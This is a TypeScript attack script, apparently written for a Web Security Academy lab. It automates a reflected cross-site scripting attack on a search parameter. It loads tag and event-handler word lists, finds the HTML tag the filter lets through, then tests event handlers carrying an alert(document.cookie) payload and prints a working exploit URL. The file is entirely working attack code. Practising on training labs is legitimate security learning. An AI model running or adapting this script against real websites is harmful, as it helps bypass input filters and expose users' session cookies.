import axios from "axios";
import * as fs from "fs";
import * as path from "path";

const baseURL =
  "https://0a2400b8032a9e48c0c15a6f00020036.web-security-academy.net//?search=test";

const attack = async () => {
  const presetsPath = path.join(__dirname, "../");
  console.log(presetsPath);
  const tags = fs
    .readFileSync(presetsPath + "tags.txt")
    .toString()
    .split("\n");
  const events = fs
    .readFileSync(presetsPath + "events.txt")
    .toString()
    .split("\n");
  console.log(tags, events);
  let vulnerableTag;
  for (let tag of tags) {
    try {
      const modifiedURL = baseURL + `<${tag}></${tag}>`;
      const res = await axios.get(modifiedURL);
      if (res.status === 200) {
        vulnerableTag = tag;
      }
    } catch (e) {
      console.log(e.response);
      if (e.response.status === 400) {
        continue;
      } else {
        break;
      }
    }
  }
  console.log("Vulnerable tag is: ", vulnerableTag);
  let vulnerableEvent: string;
  let exploitableURL: string;
  for (let event of events) {
    try {
      const modifiedURL =
        baseURL +
        `<${vulnerableTag} ${event}=alert(document.cookie)></${vulnerableTag}>`;
      const res = await axios.get(modifiedURL);
      if (res.status === 200) {
        vulnerableEvent = event;
        exploitableURL = modifiedURL;
      }
    } catch (e) {
      console.log(e.response);
      if (e.response.status === 400) {
        continue;
      } else {
        break;
      }
    }
  }

  console.log(
    "Vulnerable tag and event are: ",
    vulnerableTag,
    " and ",
    vulnerableEvent
  );
  console.log("Exploitable URL is: ", exploitableURL);
};

attack();
